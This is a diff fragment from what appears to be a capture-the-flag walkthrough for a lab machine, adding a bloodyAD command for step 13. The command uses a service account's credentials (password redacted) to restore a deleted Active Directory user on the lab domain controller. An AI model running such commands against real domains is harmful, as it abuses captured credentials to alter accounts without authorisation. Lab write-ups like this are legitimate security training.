@@ -88,7 +88,7 @@
 
 13. Restore todd.wolfe user using bloodyAD
 
-``
+`bloodyAD -u svc_ldap -d voleur.htb -p '[PASSWORD]' --host dc.voleur.htb --dc-ip 10.129.16.120 -k set restore 'todd.wolfe'`
 
 <img width="852" height="76" alt="image" src="https://github.com/user-attachments/assets/dfc5cc81-0a1b-4568-8766-2f2cfe19a164" />
 
